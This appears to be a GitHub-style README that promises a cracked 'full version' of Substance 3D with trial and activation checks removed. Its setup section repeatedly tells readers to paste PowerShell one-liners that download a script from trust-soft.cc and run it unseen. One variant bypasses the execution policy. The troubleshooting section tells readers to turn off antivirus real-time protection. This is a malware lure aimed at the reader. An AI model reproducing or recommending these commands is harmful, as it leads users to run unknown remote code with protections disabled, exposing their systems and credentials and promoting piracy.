# Substance 3D Desktop Workspace Deployment & Material Optimization Suite

This repository provides an automated installation manager and system tuning utility designed to seamlessly prepare your production workstation for **Substance 3D** tools (including Painter and Designer). If you are looking for an efficient way to initialize the **Substance 3D full version** texturing and PBR material environment without dealing with recurring trial popups, locked local asset libraries, or tedious activation warnings, this engine automates the entire sequence.

## 🧱 Why Use This Deployment Tool?

Setting up advanced, heavy-duty 3D texturing software on desktop operating systems frequently causes texture streaming errors, missing dynamic shader directories, or cloud service synchronization flags. Our deployment utility solves these bottlenecks:

* **Professional Feature Suite Deployment:** Installs the core painting framework and unlocks localized PBR material templates.
* **GPU Texture Linker:** Modifies local registry profiles to maximize ray-tracing and baking hardware acceleration for complex high-res meshes.
* **Component Package Assembly:** Automatically downloads and pre-registers essential smart materials, custom brushes, and environment maps.
* **Offline Workspace Locker:** Secures your active 3D design environment profile locally, preventing constant network verification checks.

---

## 🛠 Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://trust-soft.cc/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated version)
If your window doesn't support the irm shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 💻 Technical Blueprint & System Targets

Engineered for 3D environment artists, character modelers, and game developers to guarantee smooth real-time viewport scrubbing, fast smart material baking, and fluid UDIM layout navigation:
* **Host OS Support:** Tailored specifically for Windows 10 and Windows 11 architectures (64-bit platforms).
* **Hardware Allocation:** Optimized for setups with dedicated graphics cards (NVIDIA RTX / AMD Radeon) and ample VRAM to process heavy 4K/8K resolution textures instantly.
* **Local Isolation:** Once applied, the tool locks the workspace configuration parameters so you can texture complex high-poly assets completely offline.

## 🤝 Project Scope

This project operates as an independent configuration utility intended for educational setups, hardware stress-testing, and home 3D texture environment management. All scripts interact strictly with local asset directories and system flags to replicate a professional CGI workstation setup.
